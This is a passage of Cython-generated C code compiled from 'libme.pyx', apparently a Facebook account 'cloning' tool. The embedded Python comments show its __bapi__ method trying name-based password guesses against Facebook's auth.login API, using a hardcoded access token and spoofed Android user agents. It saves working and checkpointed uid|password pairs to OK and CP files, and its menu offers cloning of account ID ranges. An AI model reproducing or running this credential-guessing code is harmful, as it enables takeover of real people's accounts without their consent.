 * 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers)
 * 			if "session_key" in response.text and "EAAA" in response.text:
 * 				print("\r  \033[0;92m ~> %s|%s\033[0;97m         "%(uid, pw))             # <<<<<<<<<<<<<<
 * 				self.ok.append("%s|%s"%(uid, pw))
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 */
      __pyx_t_7 = PyTuple_New(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 605, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_v_pw);
      __pyx_t_8 = __Pyx_PyString_Format(__pyx_kp_s_0_92m_s_s_0_97m, __pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 605, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (__Pyx_PrintOne(0, __pyx_t_8) < 0) __PYX_ERR(0, 605, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      /* "libme.pyx":606
 * 			if "session_key" in response.text and "EAAA" in response.text:
 * 				print("\r  \033[0;92m ~> %s|%s\033[0;97m         "%(uid, pw))
 * 				self.ok.append("%s|%s"%(uid, pw))             # <<<<<<<<<<<<<<
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break
 */
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_ok); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 606, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_7 = PyTuple_New(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 606, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_v_pw);
      __pyx_t_6 = __Pyx_PyString_Format(__pyx_kp_s_s_s, __pyx_t_7); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 606, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_13 = __Pyx_PyObject_Append(__pyx_t_8, __pyx_t_6); if (unlikely(__pyx_t_13 == ((int)-1))) __PYX_ERR(0, 606, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      /* "libme.pyx":607
 * 				print("\r  \033[0;92m ~> %s|%s\033[0;97m         "%(uid, pw))
 * 				self.ok.append("%s|%s"%(uid, pw))
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))             # <<<<<<<<<<<<<<
 * 				break
 * 			elif "www.facebook.com" in response.json()["error_msg"]:
 */
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_date); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 607, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_7 = __Pyx_PyString_FormatSafe(__pyx_kp_s_OK_s_txt, __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 607, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = PyTuple_New(2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 607, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_GIVEREF(__pyx_t_7);
      PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_t_7);
      __Pyx_INCREF(__pyx_n_s_a);
      __Pyx_GIVEREF(__pyx_n_s_a);
      PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_n_s_a);
      __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_8, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 607, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_write); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 607, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = PyTuple_New(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 607, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_v_pw);
      __pyx_t_3 = __Pyx_PyString_Format(__pyx_kp_s_s_s_2, __pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 607, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_8);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_8, function);
        }
      }
      __pyx_t_6 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_7, __pyx_t_3) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_3);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 607, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      /* "libme.pyx":608
 * 				self.ok.append("%s|%s"%(uid, pw))
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break             # <<<<<<<<<<<<<<
 * 			elif "www.facebook.com" in response.json()["error_msg"]:
 * 				print("\r  \033[0;97m ~> %s|%s\033[0;97m         "%(uid, pw))
 */
      goto __pyx_L4_break;

      /* "libme.pyx":604
 * 			}
 * 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers)
 * 			if "session_key" in response.text and "EAAA" in response.text:             # <<<<<<<<<<<<<<
 * 				print("\r  \033[0;92m ~> %s|%s\033[0;97m         "%(uid, pw))
 * 				self.ok.append("%s|%s"%(uid, pw))
 */
    }

    /* "libme.pyx":609
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break
 * 			elif "www.facebook.com" in response.json()["error_msg"]:             # <<<<<<<<<<<<<<
 * 				print("\r  \033[0;97m ~> %s|%s\033[0;97m         "%(uid, pw))
 * 				self.cp.append("%s|%s"%(uid, pw))
 */
    __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_json); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 609, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_8);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_8, function);
      }
    }
    __pyx_t_6 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 609, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_8 = __Pyx_PyObject_Dict_GetItem(__pyx_t_6, __pyx_n_s_error_msg); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 609, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_10 = (__Pyx_PySequence_ContainsTF(__pyx_kp_s_www_facebook_com, __pyx_t_8, Py_EQ)); if (unlikely(__pyx_t_10 < 0)) __PYX_ERR(0, 609, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_11 = (__pyx_t_10 != 0);
    if (__pyx_t_11) {

      /* "libme.pyx":610
 * 				break
 * 			elif "www.facebook.com" in response.json()["error_msg"]:
 * 				print("\r  \033[0;97m ~> %s|%s\033[0;97m         "%(uid, pw))             # <<<<<<<<<<<<<<
 * 				self.cp.append("%s|%s"%(uid, pw))
 * 				open("CP/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 */
      __pyx_t_8 = PyTuple_New(2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 610, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_v_pw);
      __pyx_t_6 = __Pyx_PyString_Format(__pyx_kp_s_0_97m_s_s_0_97m, __pyx_t_8); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 610, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (__Pyx_PrintOne(0, __pyx_t_6) < 0) __PYX_ERR(0, 610, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      /* "libme.pyx":611
 * 			elif "www.facebook.com" in response.json()["error_msg"]:
 * 				print("\r  \033[0;97m ~> %s|%s\033[0;97m         "%(uid, pw))
 * 				self.cp.append("%s|%s"%(uid, pw))             # <<<<<<<<<<<<<<
 * 				open("CP/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break
 */
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_cp); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 611, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_8 = PyTuple_New(2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 611, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_v_pw);
      __pyx_t_3 = __Pyx_PyString_Format(__pyx_kp_s_s_s, __pyx_t_8); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 611, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_13 = __Pyx_PyObject_Append(__pyx_t_6, __pyx_t_3); if (unlikely(__pyx_t_13 == ((int)-1))) __PYX_ERR(0, 611, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

      /* "libme.pyx":612
 * 				print("\r  \033[0;97m ~> %s|%s\033[0;97m         "%(uid, pw))
 * 				self.cp.append("%s|%s"%(uid, pw))
 * 				open("CP/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))             # <<<<<<<<<<<<<<
 * 				break
 * 			else:
 */
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_date); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 612, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_8 = __Pyx_PyString_FormatSafe(__pyx_kp_s_CP_s_txt, __pyx_t_6); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 612, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = PyTuple_New(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 612, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GIVEREF(__pyx_t_8);
      PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_8);
      __Pyx_INCREF(__pyx_n_s_a);
      __Pyx_GIVEREF(__pyx_n_s_a);
      PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_n_s_a);
      __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_6, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 612, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_write); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 612, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = PyTuple_New(2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 612, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_v_pw);
      __pyx_t_7 = __Pyx_PyString_Format(__pyx_kp_s_s_s_2, __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 612, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_8)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_8);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_3 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_8, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_7);
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 612, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

      /* "libme.pyx":613
 * 				self.cp.append("%s|%s"%(uid, pw))
 * 				open("CP/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break             # <<<<<<<<<<<<<<
 * 			else:
 * 				continue
 */
      goto __pyx_L4_break;

      /* "libme.pyx":609
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break
 * 			elif "www.facebook.com" in response.json()["error_msg"]:             # <<<<<<<<<<<<<<
 * 				print("\r  \033[0;97m ~> %s|%s\033[0;97m         "%(uid, pw))
 * 				self.cp.append("%s|%s"%(uid, pw))
 */
    }

    /* "libme.pyx":615
 * 				break
 * 			else:
 * 				continue             # <<<<<<<<<<<<<<
 * 
 * 		self.loop += 1
 */
    /*else*/ {
      goto __pyx_L3_continue;
    }

    /* "libme.pyx":590
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 * 		); sys.stdout.flush()
 * 		for pw in pwx:             # <<<<<<<<<<<<<<
 * 			pw = pw.lower()
 * 			ses = requests.Session()
 */
    __pyx_L3_continue:;
  }
  __pyx_L4_break:;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":617
 * 				continue
 * 
 * 		self.loop += 1             # <<<<<<<<<<<<<<
 * 	def __method__1__(self):
 * 		print("\n  [1] Clone only 100074 & 100075 account")
 */
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_loop); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 617, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyInt_AddObjC(__pyx_t_1, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 617, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_loop, __pyx_t_3) < 0) __PYX_ERR(0, 617, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "libme.pyx":574
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__bapi__, uid, pwx)
 * 	def __bapi__(self, uid, pwx):             # <<<<<<<<<<<<<<
 * 		ua = random.choice([
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_AddTraceback("libme.James.__bapi__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_ua);
  __Pyx_XDECREF(__pyx_v_pw);
  __Pyx_XDECREF(__pyx_v_ses);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":618
 * 
 * 		self.loop += 1
 * 	def __method__1__(self):             # <<<<<<<<<<<<<<
 * 		print("\n  [1] Clone only 100074 & 100075 account")
 * 		print("  [2] Clone All in one Account")
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_39__method__1__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_39__method__1__ = {"__method__1__", (PyCFunction)__pyx_pw_5libme_5James_39__method__1__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_39__method__1__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__method__1__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_38__method__1__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_38__method__1__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_v___method__1__ = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  int __pyx_t_2;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__method__1__", 0);

  /* "libme.pyx":619
 * 		self.loop += 1
 * 	def __method__1__(self):
 * 		print("\n  [1] Clone only 100074 & 100075 account")             # <<<<<<<<<<<<<<
 * 		print("  [2] Clone All in one Account")
 * 		print("  [3] Clone Using File Path")
 */
  if (__Pyx_PrintOne(0, __pyx_kp_s_1_Clone_only_100074_100075_acco) < 0) __PYX_ERR(0, 619, __pyx_L1_error)

  /* "libme.pyx":620
 * 	def __method__1__(self):
 * 		print("\n  [1] Clone only 100074 & 100075 account")
 * 		print("  [2] Clone All in one Account")             # <<<<<<<<<<<<<<
 * 		print("  [3] Clone Using File Path")
 * 		__method__1__ = input("\n  [] Select One : ")
 */
  if (__Pyx_PrintOne(0, __pyx_kp_s_2_Clone_All_in_one_Account) < 0) __PYX_ERR(0, 620, __pyx_L1_error)

  /* "libme.pyx":621
 * 		print("\n  [1] Clone only 100074 & 100075 account")
 * 		print("  [2] Clone All in one Account")
 * 		print("  [3] Clone Using File Path")             # <<<<<<<<<<<<<<
 * 		__method__1__ = input("\n  [] Select One : ")
 * 		if __method__1__ == "":
 */
  if (__Pyx_PrintOne(0, __pyx_kp_s_3_Clone_Using_File_Path) < 0) __PYX_ERR(0, 621, __pyx_L1_error)

  /* "libme.pyx":622
 * 		print("  [2] Clone All in one Account")
 * 		print("  [3] Clone Using File Path")
 * 		__method__1__ = input("\n  [] Select One : ")             # <<<<<<<<<<<<<<
 * 		if __method__1__ == "":
 * 			self.menu_file()
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__4, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 622, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v___method__1__ = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "libme.pyx":623
 * 		print("  [3] Clone Using File Path")
 * 		__method__1__ = input("\n  [] Select One : ")
 * 		if __method__1__ == "":             # <<<<<<<<<<<<<<
 * 			self.menu_file()
 * 		elif __method__1__ == "1":
 */
  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_v___method__1__, __pyx_kp_s_, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 623, __pyx_L1_error)
  if (__pyx_t_2) {

    /* "libme.pyx":624
 * 		__method__1__ = input("\n  [] Select One : ")
 * 		if __method__1__ == "":
 * 			self.menu_file()             # <<<<<<<<<<<<<<
 * 		elif __method__1__ == "1":
 * 			self.__10007__()
 */
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_menu_file); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 624, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 624, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "libme.pyx":623
 * 		print("  [3] Clone Using File Path")
 * 		__method__1__ = input("\n  [] Select One : ")
 * 		if __method__1__ == "":             # <<<<<<<<<<<<<<
 * 			self.menu_file()
 * 		elif __method__1__ == "1":
 */
    goto __pyx_L3;
  }

  /* "libme.pyx":625
 * 		if __method__1__ == "":
 * 			self.menu_file()
 * 		elif __method__1__ == "1":             # <<<<<<<<<<<<<<
 * 			self.__10007__()
 * 			self.__10000__()
 */
  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_v___method__1__, __pyx_kp_s_1, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 625, __pyx_L1_error)
  if (__pyx_t_2) {

    /* "libme.pyx":626
 * 			self.menu_file()
 * 		elif __method__1__ == "1":
 * 			self.__10007__()             # <<<<<<<<<<<<<<
 * 			self.__10000__()
 * 		elif __method__1__ == "2":
 */
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_10007); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 626, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 626, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "libme.pyx":627
 * 		elif __method__1__ == "1":
 * 			self.__10007__()
 * 			self.__10000__()             # <<<<<<<<<<<<<<
 * 		elif __method__1__ == "2":
 * 			self.__ma__sal2__()
 */
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_10000_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 627, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
